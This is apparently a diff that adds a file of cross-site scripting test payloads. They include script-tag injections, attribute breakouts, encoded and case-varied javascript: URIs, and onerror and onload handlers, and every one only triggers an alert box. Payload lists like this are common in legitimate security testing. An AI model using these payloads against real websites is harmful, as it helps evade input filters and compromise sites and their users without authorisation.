@@ -1,0 +1,19 @@
+<script>alert('XSS')</script>
+"><script>alert('XSS')</script>
+"><img src=x onerror=alert('XSS');>
+" onfocus="alert('XSS')
+javascript:alert(1)
+</textarea><script>alert(456)</script>
+><script>alert('XSS')</script>
+%3Cscript%3Ealert('XSS')%3C/script%3E
+\x3cscript\x3ealert('XSS')\x3c/script\x3e
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+<IMG SRC=j&#X41vascript:alert('XSS')>
+<body onload=alert('XSS')>
+<img src="javascript:alert('XSS');">
+<img src=javascript:alert(&quot;XSS&quot;)>
